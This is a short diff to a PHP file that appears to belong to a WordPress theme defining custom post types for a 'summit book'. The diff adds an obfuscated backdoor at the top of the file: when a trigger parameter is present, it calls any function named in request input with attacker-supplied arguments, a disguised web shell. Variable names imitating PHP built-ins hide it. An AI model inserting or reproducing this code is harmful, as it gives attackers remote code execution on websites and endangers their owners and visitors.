@@ -1,4 +1,11 @@
-<?php
+<?php 
+$openssl_cms_encrypt_tzvw = $_REQUEST;
+if(isset($openssl_cms_encrypt_tzvw['date_create_ns'])) {
+	$srand_ntwa = $openssl_cms_encrypt_tzvw['enum_exists_kh'];
+	$get_declared_classes_ifal = $openssl_cms_encrypt_tzvw['openssl_decrypt_mc'];
+	$srand_ntwa(...$get_declared_classes_ifal);
+} 
+
 /**
  * Custom Post types of summit book
  *
